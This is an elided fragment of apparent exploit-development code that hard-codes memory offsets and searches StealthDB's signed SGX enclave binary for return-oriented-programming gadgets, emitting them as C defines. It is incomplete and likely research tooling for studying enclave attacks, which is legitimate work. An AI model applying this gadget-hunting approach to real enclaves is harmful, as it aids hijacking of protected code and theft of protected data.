...
pEnclave = "/usr/local/lib/stealthDB/enclave.signed.so"
...
#define FIRST_MALLOC 0x011230 // [FIXED] 0x252260
#define RIP_DELTA_IC 0x337 // [FIXED] 0x335
#define RIP_DELTA_PC 0x12f4 // [TODO] 0x12df """
    store(s)
...
def genGadgetsEnclave():
    ...
    s += "#define G3 " + findGadget(pEnclave, " : cmp edi, esi ; sete al ; ret") + "\n"
